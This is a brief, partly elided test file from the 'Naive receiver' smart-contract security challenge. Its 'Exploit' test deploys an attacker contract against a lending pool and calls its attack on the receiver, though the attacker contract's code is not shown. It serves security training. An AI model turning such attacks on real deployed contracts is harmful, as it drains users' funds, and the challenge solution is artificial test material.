...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    ...
    const attackContractFactory = await ethers.getContractFactory("naiveAttacker", attacker);

    const attackerContract = await attackContractFactory.deploy(this.pool.address);

    await attackerContract.attack(this.receiver.address);
  });
